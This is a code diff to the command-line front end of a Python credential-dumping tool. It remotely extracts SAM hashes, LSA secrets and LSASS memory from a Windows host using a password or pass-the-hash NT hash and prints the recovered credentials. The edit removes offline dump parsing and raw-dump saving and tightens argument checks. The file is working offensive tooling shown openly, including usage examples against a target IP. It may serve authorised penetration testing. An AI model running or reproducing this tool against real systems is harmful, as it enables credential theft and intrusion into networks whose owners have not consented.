@@ -13,40 +13,29 @@ def main():
         epilog="""examples:
   python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
   python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam
-  python main.py -t 10.0.0.5 -u admin -p pass --lsass -o lsass.dmp
-  python main.py --parse lsass.dmp
+  python main.py -t 10.0.0.5 -u admin -p pass --lsass
 """,
     )
 
     # Target / auth
-    parser.add_argument("-t", "--target", help="Target IP or hostname")
-    parser.add_argument("-u", "--username", help="Username")
+    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
+    parser.add_argument("-u", "--username", required=True, help="Username")
     parser.add_argument("-p", "--password", default="", help="Password")
     parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
                         metavar="NTHASH", help="NT hash (32 hex chars)")
     parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
 
-    # What to extract
+    # What to extract (at least one required)
     parser.add_argument("--sam", action="store_true", help="Extract SAM hashes")
     parser.add_argument("--lsa", action="store_true", help="Extract LSA secrets")
-    parser.add_argument("--lsass", action="store_true", help="Dump LSASS memory")
+    parser.add_argument("--lsass", action="store_true", help="Dump and parse LSASS memory")
 
     # Options
     parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected)")
     parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
-    parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")
-    parser.add_argument("--parse", default=None, metavar="FILE", help="Parse an existing .dmp file offline")
 
     args = parser.parse_args()
 
-    # Offline parse mode
-    if args.parse:
-        _cmd_parse(args.parse)
-        return
-
-    # Validate required args for remote mode
-    if not args.target or not args.username:
-        parser.error("-t/--target and -u/--username are required")
     if not args.password and not args.nt_hash:
         parser.error("provide either -p/--password or -H/--hash")
     if args.nt_hash:
@@ -54,10 +43,8 @@ def main():
         if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
             parser.error("--hash must be exactly 32 hex characters")
         args.nt_hash = h
-
-    # Default: if no flags, do everything
     if not args.sam and not args.lsa and not args.lsass:
-        args.sam = args.lsa = args.lsass = True
+        parser.error("specify at least one of --sam, --lsa, --lsass")
 
     _cmd_dump(args)
 
@@ -108,11 +95,6 @@ def _cmd_dump(args):
 
             # LSASS
             if args.lsass and result.lsass_dump:
-                print(f"\n[+] LSASS dump: {len(result.lsass_dump)} bytes ({len(result.lsass_dump) // 1024 // 1024} MB)")
-                if args.output:
-                    with open(args.output, "wb") as f:
-                        f.write(result.lsass_dump)
-                    print(f"[+] Saved to {args.output}")
                 _show_lsass(result.lsass_dump)
             elif args.lsass:
                 print("\n[-] No LSASS data received")
@@ -186,15 +168,3 @@ def _show_lsass(dump_data: bytes):
         else:
             secret = ""
         print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
-
-
-def _cmd_parse(filepath: str):
-    if not os.path.isfile(filepath):
-        print(f"[!] File not found: {filepath}")
-        sys.exit(1)
-
-    with open(filepath, "rb") as f:
-        dump_data = f.read()
-
-    print(f"[*] Parsing {filepath} ({len(dump_data)} bytes)")
-    _show_lsass(dump_data)
